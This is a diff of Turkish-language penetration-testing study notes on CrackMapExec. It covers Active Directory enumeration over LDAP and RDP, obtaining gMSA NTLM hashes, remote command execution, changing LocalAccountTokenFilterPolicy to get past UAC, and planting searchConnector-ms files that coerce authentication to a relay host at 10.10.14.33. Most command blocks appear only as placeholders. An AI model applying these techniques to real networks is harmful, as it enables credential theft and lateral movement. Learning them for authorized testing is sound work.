+WMI, sınıflarını hiyerarşik bir namespace içinde düzenler. Bir sorgu gerçekleştirmek için, Class Name ve bulunduğu Namespace'i bilmemiz gerekir. Yukarıdaki örnekte, `Win32_Process` sınıfını `root\cimv2` namespace'inde sorguluyoruz. Namespace'i belirtmedik çünkü varsayılan olarak CME, `root\cimv2`'yi kullanır (bu bilgiyi --help menüsünde görebiliriz).
+
+Başka bir namespace'i sorgulamak için onu belirtmemiz gerekir. Örneğin, `root\WMI` namespace'inde bulunan `MSPower_DeviceEnable` sınıfını sorgulayalım. Bu sınıf, sistem çalışırken dinamik olarak açılıp kapanması gereken cihazlar hakkında bilgi tutar. Belirli bir konuyla ilgili WMI sınıflarının nasıl bulunacağı hakkında daha fazla bilgi edinmek için [Microsoft](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_wmi?view=powershell-5.1#finding-wmi-classes) ve [wutils.com'](https://wutils.com/wmi/)daki 3. taraf belgelerini kullanabiliriz.
 
 
 ### Quering root\WMI Namespace
-![Pasted image 20241202212300.png](/img/user/resimler/Pasted%20image%2020241202212300.png)
-![Pasted image 20241202212343.png](/img/user/resimler/Pasted%20image%2020241202212343.png)
 
-Not: Genellikle, WMI'yı sorgulamak için yönetici ayrıcalıklarına sahip olmamız gerekir, ancak bir yönetici, WMI'yı sorgulamak için yönetici olmayan bir hesabı yapılandırabilir. Bu durumda, WMI sorgularını gerçekleştirmek için yönetici olmayan bir hesap kullanabiliriz.
+{{CODE_BLOCK_136}}
 
-WMI Sorgu Dili (WQL) hakkında daha fazla bilgi edinmek için Microsoft'un Belgelerini okuyabiliriz.
+Not: Genellikle, WMI'yı sorgulamak için administrative ayrıcalıklarına sahip olmamız gerekir, ancak bir administrator, WMI'yı sorgulamak için administrator olmayan bir hesabı yapılandırabilir. Bu durumda, WMI sorgularını gerçekleştirmek için administrator olmayan bir hesap kullanabiliriz.
+
+WMI Sorgu Dili (WQL) hakkında daha fazla bilgi edinmek için [Microsoft'un Belgelerini](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wql-sql-for-wmi) okuyabiliriz.
+
+
 
 Aşağıdaki bölüm LDAP ve RDP protokollerini kullanarak numaralandırmayı kapsayacaktır.
 
+----
+
 
 ### LDAP and RDP Enumeration
-Daha önce, CrackMapExec'te en çok kullanılan protokol olan SMB ile bazı numaralandırma seçeneklerini inceledik, ancak LDAP ve RDP protokolleri ile daha fazla numaralandırma seçeneği vardır
+
+Daha önce, CrackMapExec'te en çok kullanılan protokol olan `SMB` ile bazı numaralandırma seçeneklerini inceledik, ancak `LDAP` ve `RDP` protokolleri ile daha fazla numaralandırma seçeneği vardır
 
 Bu bölümde, bu seçeneklerden bazıları ve hedeflerimizi nasıl daha fazla numaralandırabileceğimiz gösterilecektir
 
-
 ### LDAP & RDP Commands
+
 LDAP ve RDP protokolleri aşağıdaki seçenekleri içerir:
-![Pasted image 20241202225531.png](/img/user/resimler/Pasted%20image%2020241202225531.png)
-![Pasted image 20241202225542.png](/img/user/resimler/Pasted%20image%2020241202225542.png)
 
-Henüz çalışmadıklarımızı gözden geçirelim.
+| Komut                                                                          | Açıklama                                                                                           |
+| ------------------------------------------------------------------------------ | -------------------------------------------------------------------------------------------------- |
+| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --users`                  | Etkin Domain kullanıcılarını listeler.                                                             |
+| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --groups`                 | Domain gruplarını listeler.                                                                        |
+| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --password-notrequired`   | `PASSWORD_NOTREQD` bayrağı olan kullanıcıları listeler.                                            |
+| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --trusted-for-delegation` | `TRUSTED_FOR_DELEGATION` bayrağı olan kullanıcı ve bilgisyalarını listeler.                        |
+| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --admin-count`            | `adminCount=1` derecesine sahip objeleri listeler.                                                 |
+| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --get-sid`                | Domainin SID bilgisini alır.                                                                       |
+| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --gmsa`                   | GMSA (Gruplandırılmış Yönetici Hizmet Hesapları) şifrelerini listeler.                             |
+| `crackmapexec rdp <hedef> -u <kullanıcı> -p <şifre> --nla-screenshot`          | NLA (Ağ Seviyesinde Kimlik Doğrulaması) devre dışı ise RDP giriş ekranının ekran görüntüsünü alır. |
+| `crackmapexec rdp <hedef> -u <kullanıcı> -p <şifre> --screenshot`              | Bağlantı başarılıysa RDP oturumunun ekran görüntüsünü alır.                                        |
+| `crackmapexec rdp <hedef> -u <kullanıcı> -p <şifre> --screentime`              | Masaüstü görüntüsü için bekleme süresini belirtir.                                                 |
+| `crackmapexec rdp <hedef> -u <kullanıcı> -p <şifre> --res RES`                 | Çözünürlük belirler (örnek format: WIDTHxHEIGHT, varsayılan: 1024x768).                            |
 
+Henüz çalışmadıklarımız varsa onları gözden geçirelim.
 
 ### Enumerating Users and Groups
 
-SMB protokolünde yaptığımız gibi, LDAP ile de kullanıcıları ve grupları listeleyebiliriz:
+SMB protokolünde yaptığımız gibi, `LDAP` ile de kullanıcıları ve grupları listeleyebiliriz:
 
 ### Enumerating Users and Groups
 
-![Pasted image 20241202225710.png](/img/user/resimler/Pasted%20image%2020241202225710.png)
-![Pasted image 20241202225721.png](/img/user/resimler/Pasted%20image%2020241202225721.png)
-![Pasted image 20241202225733.png](/img/user/resimler/Pasted%20image%2020241202225733.png)
-![Pasted image 20241202225743.png](/img/user/resimler/Pasted%20image%2020241202225743.png)
+{{CODE_BLOCK_137}}
 
-Not: Domain FQDN'sini çözümleyemezsek LDAP protokol iletişimlerinin çalışmayacağını unutmayın. Domain DNS sunucularına bağlanmıyorsak, FQDN'yi /etc/hosts dosyasında yapılandırmamız gerekir
+Not: Domain FQDN'sini çözümleyemezsek LDAP protokol iletişimlerinin çalışmayacağını unutmayın. Domain DNS sunucularına bağlanmıyorsak, FQDN'yi `/etc/hosts` dosyasında yapılandırmamız gerekir
 
 
 ### İlginç Hesap Özelliklerini Numaralandırma
 
-ldap protokolü, PASSWD_NOTREQD veya TRUSTED_FOR_DELEGATION bayrağı ile hesapları tanımlamamıza yardımcı olacak birkaç seçeneğe daha sahiptir ve hatta adminCount değeri 1 olan tüm hesapları sorgulayabiliriz.
+`ldap` protokolü, `PASSWD_NOTREQD` veya `TRUSTED_FOR_DELEGATION` bayrağı ile hesapları tanımlamamıza yardımcı olacak birkaç seçeneğe daha sahiptir ve hatta `adminCount` değeri `1` olan tüm hesapları sorgulayabiliriz.
 
-PASSWD_NOTREQD hesap denetimi özniteliği ayarlanmışsa, kullanıcı geçerli parola ilkesi uzunluğuna tabi değildir, yani daha kısa bir parolaya sahip olabilir veya hiç parola kullanmayabilir ( domain'de boş parolalara izin veriliyorsa). Bu hesapları tanımlamak için --password-notrequired seçeneğini kullanabiliriz.
-
-
-### PASSWD_NOTREQD Özniteliğinin Tanımlanması
-
-![Pasted image 20241202230116.png](/img/user/resimler/Pasted%20image%2020241202230116.png)
-![Pasted image 20241202230124.png](/img/user/resimler/Pasted%20image%2020241202230124.png)
-
-TRUSTED_FOR_DELEGATION özniteliği ayarlanırsa, bir hizmetin altında çalıştığı hizmet hesabı (kullanıcı veya bilgisayar) Kerberos yetkilendirmesi için güvenilirdir, yani hizmeti talep eden bir istemciyi taklit edebilir. Bu saldırı türüne Kerberos Unconstrained Delegation adı verilir. Bu konu hakkında daha fazla bilgi edinmek için bu [blog](https://adsecurity.org/?p=1667) yazısını okuyabilirsiniz.
-
-### Kısıtlamasız Delegasyonun Belirlenmesi
-![Pasted image 20241202230729.png](/img/user/resimler/Pasted%20image%2020241202230729.png)
-
-adminCount özniteliği, SDProp işleminin bir kullanıcıyı koruyup korumadığını belirler. Bu işlemde, Active Directory'deki AdminSDHolder, korunan kullanıcı hesaplarının ACL izinleri için bir şablon görevi görür. Herhangi bir ACE hesabı değiştirilirse (örneğin, bir saldırgan tarafından), bu işlem tarafından korunan hesapların ACL izinleri, SDProp işlemi her çalıştığında şablon izin kümesine sıfırlanır; bu varsayılan olarak her 60 dakikada bir yapılır ancak değiştirilebilir. Değer 0 olarak ayarlanmışsa veya belirtilmemişse kullanıcı kapsam dışıdır. Öznitelik değeri 1 olarak ayarlanırsa kullanıcı korunur. Saldırganlar genellikle dahili bir ortamda hedef almak için adminCount özniteliği 1 olarak ayarlanmış hesapları ararlar. Bunlar genellikle ayrıcalıklı hesaplardır ve daha fazla erişime veya domain'in tamamen ele geçirilmesine yol açabilir.
+`PASSWD_NOTREQD` hesap denetimi attribute ayarlanmışsa, kullanıcı geçerli password policy uzunluğuna tabi değildir, yani daha kısa bir parolaya sahip olabilir veya hiç parola kullanmayabilir (domain'de boş parolalara izin veriliyorsa). Bu hesapları tanımlamak için  `--password-notrequired` seçeneğini kullanabiliriz.
 
 
-### adminCount Özniteliğini Sorgulama
-![Pasted image 20241202230901.png](/img/user/resimler/Pasted%20image%2020241202230901.png)
-![Pasted image 20241202230911.png](/img/user/resimler/Pasted%20image%2020241202230911.png)
-![Pasted image 20241202230921.png](/img/user/resimler/Pasted%20image%2020241202230921.png)
+### PASSWD_NOTREQD Attribute Tanımlanması
+
+{{CODE_BLOCK_138}}
+
+`TRUSTED_FOR_DELEGATION` attribute ayarlanırsa, bir servisin altında çalıştığı servis hesabı (kullanıcı veya bilgisayar) Kerberos yetkilendirmesi için güvenilirdir, yani servisi talep eden bir client'i taklit edebilir. Bu saldırı türüne `Kerberos Unconstrained Delegation` adı verilir. Bu konu hakkında daha fazla bilgi edinmek için bu [blog](https://adsecurity.org/?p=1667) yazısını okuyabilirsiniz.
+
+### Unconstrained Delegation Belirlenmesi
+
+{{CODE_BLOCK_139}}
+
+`AdminCount` attribute, SDProp process'in bir kullanıcıyı koruyup korumadığını belirler. Bu process'te, Active Directory'deki `AdminSDHolder`, korunan user account'lar için ACL permissions'ın bir template'i olarak görev yapar. Eğer herhangi bir account ACE'si (örneğin, bir attacker tarafından) modified edilirse, bu process tarafından korunan account'ların ACL permissions'ı, `SDProp` process her çalıştığında (default olarak her 60 dakikada bir çalışır, ancak bu süre modified edilebilir) templated permission set'e resetlenir. User, adminCount değeri 0 olarak set edilmişse veya specified değilse bu koruma kapsamına girmez. Eğer attribute value 1 olarak set edilmişse, user korunur. Attacker'lar genellikle internal environment'ta adminCount attribute'i 1 olan account'ları target olarak arar. Bunlar genellikle privileged account'lardır ve further access veya full domain compromise ile sonuçlanabilir.
+
+
+### adminCount Attribute'u Sorgulama
+
+{{CODE_BLOCK_140}}
 
 
 ### Domain SID'sini numaralandırma
 
-Bazı domain saldırıları, kullanıcı veya domain SID'si gibi belirli domain bilgilerini edinmemizi gerektirir. SID (Security IDentifier), bir bilgisayarın veya domain controller'ın sizi tanımlamak için kullandığı benzersiz bir kimlik numarasıdır. Domain sid, domain'i tanımlayan benzersiz bir kimlik numarasıdır. CrackMapExec kullanarak domain sid'sini almak için --get-sid bayrağını kullanabiliriz:
+Bazı domain attack'ları, bir user veya domain SID gibi belirli domain bilgilerini elde etmemizi gerektirir. SID (Security IDentifier), bir computer veya domain controller'ın sizi tanımlamak için kullandığı `unique bir ID` numarasıdır. Domain SID ise domain'i tanımlayan unique bir ID numarasıdır. CrackMapExec kullanarak domain SID'i elde etmek için `--get-sid` flag'ini kullanabiliriz:
 
+### Domain SID'i Toplama
 
-### Gathering the Domain SID
-
-![Pasted image 20241202231106.png](/img/user/resimler/Pasted%20image%2020241202231106.png)
-![Pasted image 20241202231112.png](/img/user/resimler/Pasted%20image%2020241202231112.png)
+{{CODE_BLOCK_141}}
 
 
 ### Group Managed Service Accounts (gMSA)
@@ -10563,138 +11442,158 @@ Bağımsız Yönetilen Hizmet Hesabı (standalone Managed Service Account) (sMSA
 * Basitleştirilmiş service principal name (SPN) yönetimi.
 * Yönetimi diğer yöneticilere devretme yeteneği
 
-Bu yönetilen hizmet hesabı (MSA) türü Windows Server 2008 R2 ve Windows 7'de tanıtılmıştır.
+Bu yönetilen servis hesabı (MSA) türü Windows Server 2008 R2 ve Windows 7'de tanıtılmıştır.
 
 Group Managed Service Account (gMSA) domain içinde aynı işlevselliği sağlar ancak aynı zamanda bu işlevselliği birden fazla sunucuya genişletir.
 
 Bir gMSA hesabının parolasını okuma ayrıcalıklarına sahip bir hesabı belirlemek için PowerShell'i kullanabiliriz (komut yürütmeyi bir sonraki bölümde daha ayrıntılı olarak ele alacağız):
 
-
 ### Enumerating Accounts with gMSA Privileges
-![Pasted image 20241202231402.png](/img/user/resimler/Pasted%20image%2020241202231402.png)
-![Pasted image 20241202231409.png](/img/user/resimler/Pasted%20image%2020241202231409.png)
 
-Yukarıdaki örnekte, engels kullanıcısının PrincipalsAllowedToRetrieveManagedPassword ayrıcalığına sahip olduğunu görebiliriz, bu da svc_inlaneadm$ gMSA hesabının parolasını okuyabileceği anlamına gelir. gMSA parolasını okuma hakkına sahip bir hesabı tehlikeye atarsak, hesabın NTLM parola hash'ini almak için --gmsa seçeneğini kullanabiliriz.
+{{CODE_BLOCK_142}}
+
+
+Yukarıdaki örnekte, `engels` kullanıcısının `PrincipalsAllowedToRetrieveManagedPassword` ayrıcalığına sahip olduğunu görebiliriz, bu da `svc_inlaneadm$` gMSA hesabının parolasını okuyabileceği anlamına gelir. gMSA parolasını okuma hakkına sahip bir hesabı tehlikeye atarsak, hesabın `NTLM` parola hash'ini almak için `--gmsa` seçeneğini kullanabiliriz.
 
 
 ### gMSA Parolasını Edinme
-![Pasted image 20241202231528.png](/img/user/resimler/Pasted%20image%2020241202231528.png)
+
+{{CODE_BLOCK_143}}
 
 Bu kimlik bilgilerini kullanmak için, hash'ler için -H seçeneğini kullanabiliriz.
 
-
 ### svc_inlaneadm$ Hesabı ile Paylaşılan Klasörleri İnceleme
-![Pasted image 20241202231553.png](/img/user/resimler/Pasted%20image%2020241202231553.png)
-![Pasted image 20241202231601.png](/img/user/resimler/Pasted%20image%2020241202231601.png)
 
+{{CODE_BLOCK_144}}
+
+
+---
 
 ### RDP Screenshots
-RDP protokolü aracılığıyla kullanıcı adlarını numaralandırmak için CrackMapExec'i kullanabiliriz. Hedef makinede RDP'ye yalnızca NLA ile izin verme seçeneği devre dışı bırakılmışsa, oturum açma isteminin ekran görüntüsünü almak için --nlascreenshot seçeneğini kullanabiliriz
+
+RDP protokolü aracılığıyla kullanıcı adlarını numaralandırmak için CrackMapExec'i kullanabiliriz. Hedef makinede RDP'ye yalnızca `NLA` ile izin verme seçeneği devre dışı bırakılmışsa, oturum açma isteminin ekran görüntüsünü almak için `--nlascreenshot` seçeneğini kullanabiliriz
 
 
 ### Enumerate Login Prompt
-![Pasted image 20241202231656.png](/img/user/resimler/Pasted%20image%2020241202231656.png)
+
+{{CODE_BLOCK_145}}
 
 Ekran görüntüsünü açmak için MATE'in Eye'ını veya CLI'dan eom'u kullanabiliriz.
 
 
-### Ekran Görüntüsünü Açmak için MATE'in Gözünü Kullanma
-![Pasted image 20241202231729.png](/img/user/resimler/Pasted%20image%2020241202231729.png)
+### Ekran Görüntüsünü Açmak için MATE'in Eye Kullanma
+
+{{CODE_BLOCK_146}}
+
 ![Pasted image 20241202231735.png](/img/user/resimler/Pasted%20image%2020241202231735.png)
 
-Eğer bir kullanıcı adı ve parolamız varsa, --screenshot seçeneği ile RDP protokolünü kullanarak da ekran görüntüsü alabiliriz. Bu seçenek --screentime ile birleştirilebilir, varsayılan olarak 10, RDP bağlantısı açıldıktan sonra ekran görüntüsü almak için bekleyeceği süredir. Bu, bir hedef makineye bağlandığımızda ve hedefin masaüstünü yüklemesi 10 saniyeden fazla sürdüğünde kullanışlıdır.
+Eğer bir kullanıcı adı ve parolamız varsa, `--screenshot` seçeneği ile RDP protokolünü kullanarak da ekran görüntüsü alabiliriz. Bu seçenek `--screentime` ile birleştirilebilir, varsayılan olarak `10`, RDP bağlantısı açıldıktan sonra ekran görüntüsü almak için bekleyeceği süredir. Bu, bir hedef makineye bağlandığımızda ve hedefin masaüstünü yüklemesi 10 saniyeden fazla sürdüğünde kullanışlıdır.
 
-Ekran görüntüsü seçeneğiyle birleştirilebilecek bir diğer seçenek de RDP bağlantısı sırasındaki ekran çözünürlüğüne karşılık gelen --res seçeneğidir. Bu seçenek yararlıdır çünkü aktif bir RDP oturumu bulursak, kullanıcının ekranının boyutuna bağlı olarak tüm içeriği görebiliriz veya göremeyiz. Varsayılan olarak bu seçenek 1024x768 olarak ayarlanmıştır
-
-
-
-### Taking a Screenshot
-![Pasted image 20241202232439.png](/img/user/resimler/Pasted%20image%2020241202232439.png)
-![Pasted image 20241202232444.png](/img/user/resimler/Pasted%20image%2020241202232444.png)
+Ekran görüntüsü seçeneğiyle birleştirilebilecek bir diğer seçenek de RDP bağlantısı sırasındaki ekran çözünürlüğüne karşılık gelen `--res` seçeneğidir. Bu seçenek yararlıdır çünkü aktif bir RDP oturumu bulursak, kullanıcının ekranının boyutuna bağlı olarak tüm içeriği görebiliriz veya göremeyiz. Varsayılan olarak bu seçenek `1024x768` olarak ayarlanmıştır
 
 
-Not: --screentime ve --res isteğe bağlı bayraklardır.
+### Screenshot Alma
+
+{{CODE_BLOCK_147}}
+
+
+Not: `--screentime` ve `--res` isteğe bağlı bayraklardır.
 
 Son olarak, ekran görüntüsünü açmak için MATE'in Eye'ını veya CLI'dan eom'u kullanabiliriz:
 
 
 ### Ekran Görüntüsünü Açmak için MATE'in Gözünü Kullanma
-![Pasted image 20241202232517.png](/img/user/resimler/Pasted%20image%2020241202232517.png)
+
+{{CODE_BLOCK_148}}
+
 ![Pasted image 20241202232523.png](/img/user/resimler/Pasted%20image%2020241202232523.png)
 
-
-Bu bölümde, hedeflerimizi arşivlemeye yardımcı olabilecek LDAP ve RDP kullanarak çeşitli numaralandırma seçeneklerini araştırdık. Bir sonraki bölümde CrackMapExec kullanarak komutların nasıl çalıştırılacağı incelenecektir.
-
+Bu bölümde, hedeflerimize ulaşmamıza yardımcı olabilecek LDAP ve RDP kullanarak çeşitli numaralandırma seçeneklerini inceledik. Aşağıdaki bölüm, CrackMapExec kullanarak komutların nasıl çalıştırılacağını gözden geçirecektir.
 
 
-
+---
 
 ### Command Execution
 
-Remote target üzerinde local administrator olarak bir komut çalıştırmaya çalışmadan önce UAC'nin varlığını kontrol etmeliyiz. UAC etkinleştirildiğinde, ki bu varsayılan durumdur, yalnızca RID 500'e sahip yönetici hesabı (varsayılan yönetici) remote komutları yürütebilir. Durumun böyle olup olmadığını kontrol etmek için iki registry key vardır:
+Remote target üzerinde local administrator olarak bir komut çalıştırmaya çalışmadan önce `UAC`'nin varlığını kontrol etmeliyiz. UAC etkinleştirildiğinde, ki bu varsayılan durumdur, yalnızca `RID 500`'e sahip administrator hesabı (varsayılan administrator) remote komutları yürütebilir. Durumun böyle olup olmadığını kontrol etmek için iki registry key vardır:
 
-![Pasted image 20241203095807.png](/img/user/resimler/Pasted%20image%2020241203095807.png)
+`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy`
+`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`
 
-Varsayılan olarak, LocalAccountTokenFilterPolicy değeri 0 olarak ayarlanmıştır, yani yalnızca built-in administrator hesabı (RID 500) yönetim görevlerini gerçekleştirebilir. Local administrator grubunda olsak bile, yalnızca kullanıcımızın RID'si 500 ise remote komutları çalıştırabiliriz. Değer 1 olarak ayarlanırsa tüm yönetici hesapları yönetim görevlerini yürütebilir.
+Varsayılan olarak, `LocalAccountTokenFilterPolicy` değeri 0 olarak ayarlanmıştır, yani yalnızca built-in administrator hesabı (RID 500) administration görevlerini gerçekleştirebilir. Local administrator grubunda olsak bile, yalnızca kullanıcımızın RID'si `500` ise remote komutları çalıştırabiliriz. Değer 1 olarak ayarlanırsa tüm administrative hesapları yönetim görevlerini yürütebilir.
 
-Yöneticinin yapılandırabileceği bir diğer ayar da local administrator hesabının (RID 500) uzaktan yönetim görevlerini yerine getirmesini engellemektir. Bu, FilterAdministratorToken kayıt defteri değerini 1 olarak ayarlayarak yapılabilir; bu, built-in administrator hesabının (RID 500) remote administrative tasks (uzaktan yönetim görevleri) gerçekleştiremeyeceği anlamına gelir.
+Administrator yapılandırabileceği bir diğer ayar da local administrator hesabının (RID 500) remote yönetim görevlerini yerine getirmesini engellemektir. Bu, `FilterAdministratorToken` registry değerini 1 olarak ayarlayarak yapılabilir; bu, built-in administrator hesabının (RID 500) remote administrative tasks (remote yönetim görevleri) gerçekleştiremeyeceği anlamına gelir.
 
 
+### Administrator Olarak Komut Yürütme
 
-### Command Execution as Administrator
-Komutları çalıştırmak ve administrators grubuna kimlerin üye olduğunu görmek için Administrator hesabını kullanalım. Windows komut satırı komutlarını çalıştırmak için -x seçeneğini ve ardından çalıştırmak istediğimiz komutu kullanmamız gerekir.
+Komutları çalıştırmak ve administrators grubuna kimlerin üye olduğunu görmek için Administrator hesabını kullanalım. Windows komut satırı komutlarını çalıştırmak için `-x` seçeneğini ve ardından çalıştırmak istediğimiz komutu kullanmamız gerekir.
 
 
 ### Bir Komutu Administrator Olarak Çalıştırma
-![Pasted image 20241203100035.png](/img/user/resimler/Pasted%20image%2020241203100035.png)
-![Pasted image 20241203100045.png](/img/user/resimler/Pasted%20image%2020241203100045.png)
+
+{{CODE_BLOCK_149}}
 
 
-### RID 500 Dışı Hesap Olarak Komut Yürütme
-Yukarıdaki komutta, localadmin local user Administrators grubundadır, ancak uzak komutu çalıştıramaz:
+### RID 500 Olmayan Hesap Olarak Komut Yürütme
+
+Yukarıdaki komutta, `localadmin` local user `Administrators` grubundadır, ancak remote komutu çalıştıramaz:
 
 ### Komutu localadmin olarak çalıştırma
-![Pasted image 20241203100238.png](/img/user/resimler/Pasted%20image%2020241203100238.png)
 
-Bu, UAC'nin etkin olduğu anlamına gelir. Eğer durum böyleyse, hesap yönetici olsa bile (Pwn3d!) mesajını almayacağız. Bu ayarı geri almak istiyorsak, LocalAccountTokenFilterPolicy'yi 1 olarak ayarlayabiliriz.
+{{CODE_BLOCK_150}}
+
+Bu, UAC'nin etkin olduğu anlamına gelir. Eğer durum böyleyse, hesap administrator olsa bile (Pwn3d!) mesajını almayacağız. Bu ayarı geri almak istiyorsak, `LocalAccountTokenFilterPolicy`'yi 1 olarak ayarlayabiliriz.
 
 
 ### LocalAccountTokenFilterPolicy'yi Değiştirme
-![Pasted image 20241203100321.png](/img/user/resimler/Pasted%20image%2020241203100321.png)
 
-![Pasted image 20241203100458.png](/img/user/resimler/Pasted%20image%2020241203100458.png)
+{{CODE_BLOCK_151}}
+
+
+{{CODE_BLOCK_152}}
 
 
 ### Domain Hesabı Olarak Komut Yürütme
-LocalAccountTokenFilterPolicy yalnızca local hesaplar için geçerlidir. Bir domain kullanıcımız varsa ve administrators grubunun bir parçasıysa, UAC ayarıyla bile komutu çalıştırabiliriz. Bu senaryoda, INLANEFREIGHT\robert hesabı administrators grubunun bir üyesidir, yani UAC etkin olsa bile komutları yürütebilir.
+
+`LocalAccountTokenFilterPolicy` yalnızca local hesaplar için geçerlidir. Bir domain kullanıcımız varsa ve `administrators` grubunun bir parçasıysa, UAC ayarıyla bile komutu çalıştırabiliriz. Bu senaryoda, `INLANEFREIGHT\robert` hesabı `administrators` `grubunun` bir üyesidir, yani UAC etkin olsa bile komutları yürütebilir.
 
 
 ### Komutu Robert olarak çalıştır
-![Pasted image 20241203100627.png](/img/user/resimler/Pasted%20image%2020241203100627.png)
+
+{{CODE_BLOCK_153}}
 
 
 ### SMB ile Komut Yürütme
-CME'nin dört (4) farklı komut yürütme yöntemi vardır:
-![Pasted image 20241203101103.png](/img/user/resimler/Pasted%20image%2020241203101103.png)
 
-Not: Tüm yöntemler tüm bilgisayarlarda çalışmayabilir.
+CME'nin dört (4) farklı komut yürütme yöntemi vardır:
+
+| Komut   | Açıklama                                                                                                                             |
+| ------- | ------------------------------------------------------------------------------------------------------------------------------------ |
+| wmiexec | WMI (Windows Management Instrumentation) kullanılarak komutlar yürütülür (`diskte dosya oluşturulur`).                               |
+| atexec  | Windows `görev zamanlayıcısı` ile bir görev planlayarak komutlar yürütülür (`fileless`, ancak Windows’un en son sürümünde çalışmaz). |
+| smbexec | Bir servis oluşturup çalıştırarak komutlar yürütülür (`fileless`, ancak Windows’un en son sürümünde çalışmaz).                       |
+| mmcexec | wmiexec yöntemine benzer, ancak komutlar Microsoft Yönetim Konsolu (MMC) aracılığıyla yürütülür.                                     |
+
+Not: Her yöntem her bilgisayarda çalışmayabilir.
 
 Varsayılan olarak, CME biri başarısız olursa farklı bir yürütme yöntemine geçecektir. Komutları aşağıdaki sırayla yürütmeye çalışır:
 
-![Pasted image 20241203101142.png](/img/user/resimler/Pasted%20image%2020241203101142.png)
+* 1. wmiexec 2. atexec 3. smbexec 4. mmcexec
 
-CME'yi yalnızca bir yürütme yöntemi kullanmaya zorlamak istiyorsak, örneğin --exec-method bayrağını kullanarak hangisini kullanacağımızı belirtebiliriz:
+CME'yi yalnızca bir yürütme yöntemi kullanmaya zorlamak istiyorsak, örneğin `--exec-method` bayrağını kullanarak hangisini kullanacağımızı belirtebiliriz:
 
 
 ### SMBExec Yöntemi ile Komut Yürütme
-![Pasted image 20241203101223.png](/img/user/resimler/Pasted%20image%2020241203101223.png)
+
+{{CODE_BLOCK_154}}
 
 Alternatif olarak, -X seçeneğini kullanarak PowerShell ile komutları çalıştırabiliriz:
 
-
 ### wmiexec aracılığıyla PowerShell Komut Yürütme
-![Pasted image 20241203101403.png](/img/user/resimler/Pasted%20image%2020241203101403.png)
-![Pasted image 20241203101435.png](/img/user/resimler/Pasted%20image%2020241203101435.png)
+
+{{CODE_BLOCK_155}}
+
 
 PowerShell seçeneği -X çalıştırıldığında, perde arkasında CrackMapExec aşağıdakileri yapacaktır:
 
@@ -12085,235 +12984,261 @@ Modülü kullandıktan sonra, **LNK dosyasını temizlemek** için **`-o CLEANUP
 {{CODE_BLOCK_121}}
 
 ### drop-sc Modülü ile Hash'lerin Çalınması
-Bu bölümü tamamlamadan önce, **LNK** dışındaki bir dosya formatı kullanarak kimlik doğrulamayı zorlamanın başka bir yöntemine bakalım:[ **.searchConnector-ms**](https://learn.microsoft.com/en-us/windows/win32/search/search-sconn-desc-schema-entry) ve **.library-ms** formatları. Bu dosya formatlarının çoğu Windows sürümünde varsayılan dosya ilişkilendirmeleri bulunur. Windows ile entegre olarak, belirtilen bir WebDAV paylaşımı gibi uzaktaki bir konumu gösterebilecek şekilde, herhangi bir konumdan içerik görüntülemelerini sağlarlar.
 
-Özünde, LNK dosyası ile aynı fonksiyonu yerine getirirler. Bu yöntemin keşfi hakkında daha fazla bilgi edinmek için Windows'ta search connectors ve library dosyalarını keşfetmek başlıklı [blog](https://dtm.uk/exploring-search-connectors-and-library-files-on-windows/) yazısını okuyabilirsiniz.
+Bu bölümü tamamlamadan önce, **LNK** dışında başka bir dosya formatı kullanarak kimlik doğrulamasını zorlamanın başka bir yöntemine bakalım: **[.searchConnector-ms](https://learn.microsoft.com/en-us/windows/win32/search/search-sconn-desc-schema-entry)** ve **`.library-ms`** formatları. Bu dosya formatlarının çoğu Windows sürümünde **varsayılan dosya ilişkilendirmeleri** bulunur. Windows ile entegre çalışarak içeriği rastgele bir konumdan, hatta **`WebDAV` paylaşımıyla belirtilen remote bir konumdan** gösterebilirler.
 
-CrackMapExec, paylaşılan bir klasörde bir searchConnector-ms dosyası oluşturmamızı sağlayan drop-sc adlı bir modüle sahiptir. Bunu kullanmak için, SMB fake sunucumuzu hedeflemek için URL seçeneğini belirtmemiz gerekir. Bu durumda, ntlmrelayx çalıştıran hostumuz. URL'nin çift ters eğik çizgi (\) ile kaçması gerekir, örneğin: URL=\\\\10.10.14.33\\secret .
+Özetle, bu dosyalar **LNK** dosyasıyla aynı işlevi görür. Bu yöntemin keşfi hakkında daha fazla bilgi edinmek için **"[Exploring search connectors and library files in Windows](https://dtm.uk/exploring-search-connectors-and-library-files-on-windows/)"** başlıklı blog yazısını okuyabiliriz.
+
+CrackMapExec, **`drop-sc`** adında bir modüle sahiptir. Bu modül, paylaşılan bir klasörde **`searchConnector-ms`** dosyası oluşturmamıza olanak tanır. Kullanabilmek için **URL** seçeneğini belirterek **SMB fake sunucumuzu** hedef göstermemiz gerekir. Bu durumda, **`ntlmrelayx`** çalıştıran hostumuz olacaktır. **URL** değeri çift ters eğik çizgi (`\`) ile kaçırılmalıdır. Örneğin: **`URL=\\10.10.14.33\secret`**.
 
 İsteğe bağlı olarak aşağıdaki seçenekleri belirleyebiliriz:
 
-* SHARE=name seçeneği ile hedef paylaşımlı klasör . Bu seçeneği belirtmezsek, dosyayı WRITE izinlerine sahip tüm paylaşımlara yazacaktır
+* `SHARE=name` seçeneği ile hedef paylaşımlı klasör . Bu seçeneği belirtmezsek, dosyayı `WRITE` izinlerine sahip tüm paylaşımlara yazacaktır
 
-* FILENAME=name seçeneği ile dosya adı . Bu seçeneği belirtmezsek, “Belgeler” adında bir dosya oluşturacaktır.
+* `FILENAME=name` seçeneği ile dosya adı . Bu seçeneği belirtmezsek, “`Documents`” adında bir dosya oluşturacaktır.
 
-* Oluşturduğumuz dosyaları temizlemek istiyorsak CLEANUP=True seçeneği. Eğer özel bir isim kullanacaksak filename seçeneğini belirtmemiz gerekiyor.
+* Oluşturduğumuz dosyaları temizlemek istiyorsak `CLEANUP=True` seçeneği. Eğer özel bir isim kullanacaksak filename seçeneğini belirtmemiz gerekiyor.
 
 Drop-sc'yi iş başında görelim:
 
-
 ### Dropping a searchConnector-ms File
 
